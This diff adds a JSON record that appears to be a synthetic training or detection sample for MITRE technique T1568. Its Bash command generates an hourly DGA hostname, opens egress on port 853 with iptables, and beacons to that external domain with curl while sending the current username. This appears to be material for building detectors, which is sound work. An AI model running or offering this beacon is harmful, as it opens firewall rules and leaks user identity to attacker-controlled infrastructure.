@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "SEED=\"theta\"; LABEL=$(echo -n \"${SEED}$(date -u +%Y%m%d%H)\" | md5sum | cut -c1-14); FQDN=\"${LABEL}.update-pipeline.co\"; PORT=853; iptables -A OUTPUT -p tcp --dport ${PORT} -j ACCEPT; IP=$(getent hosts \"$FQDN\" | awk '{print $1}' | head -n1); curl -sSf --resolve \"${FQDN}:${PORT}:${IP}\" \"https://${FQDN}:${PORT}/api/v1/beacon?u=$(whoami)\"",
+  "explanation": "Targets a DGA domain and connects over TLS on port 853 to mimic DoT-like traffic patterns while binding the session to the dynamically resolved IP.",
+  "rationale_steps": [
+    "Create hourly DGA hostname",
+    "Resolve via NSS to obtain an IP",
+    "Allow egress on port 853",
+    "Beacon using curl bound to resolved IP"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-a69367b6-05bd7719",
+  "source_prompt_hash": "a69367b6",
+  "timestamp_utc": "2025-09-30T09:31:37.018067Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
